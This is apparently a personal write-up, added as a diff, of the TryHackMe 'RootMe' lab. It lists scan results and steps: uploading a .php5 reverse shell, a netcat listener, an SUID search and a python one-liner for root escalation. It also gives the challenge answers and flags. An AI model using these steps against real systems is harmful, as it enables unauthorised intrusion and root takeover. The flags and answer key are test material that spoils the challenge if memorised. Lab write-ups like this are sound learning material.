@@ -1,0 +1,41 @@
+THM - RootMe
+Date - 29th August 2025
+Target IP - 10.10.31.195
+
+OPEN PORTS :- nmap
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+
+Accessible :-
+| http://10.10.31.195/
+| http://10.10.31.195/css
+| http://10.10.31.195/js
+| http://10.10.31.195/index.php
+| http://10.10.31.195/panel
+| http://10.10.31.195/uploads
+
+Steps :-
+| /panel/ --> Upload a php file (.php5) with the reverse shell command
+| nc -nvlp <PORT> --> turn on the port listener to receive the backdoor
+| /uploads/ --> double click on the php file (.php5) to activate it
+| user.txt --> cat /var/www/user.txt
+| Run - find / -user root -perm -4000 -type f 2>/dev/null (to find the weird file with SUID permissions)
+| Privilege Escalation --> /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")' (YOU GET ROOT ACCESS)
+| root.txt --> cat /root/root.txt
+
+Challenge Questions :-
+| Open Ports - 2
+| Apache Version - 2.4.41 (the recent one > does not get accepted)
+		 - 2.4.27 (the old one > gets accepted)
+| Port 22 Service - ssh 
+| Hidden Directories - /panel/
+| The weird SUID File - /usr/bin/python2.7 (does not get accepted)
+		      - /usr/bin/python (gets accepted)
+| root.txt - THM{pr1v1l3g3_3sc4l4t10n}
+
+FLAGS FOUND :-
+| user.txt - THM{y0u_g0t_a_sh3ll}
+| root.txt - THM{pr1v1l3g3_3sc4l4t10n}
+
+NOTE :- They have updated the servers and the content but did not update it in the challenge questionaire.
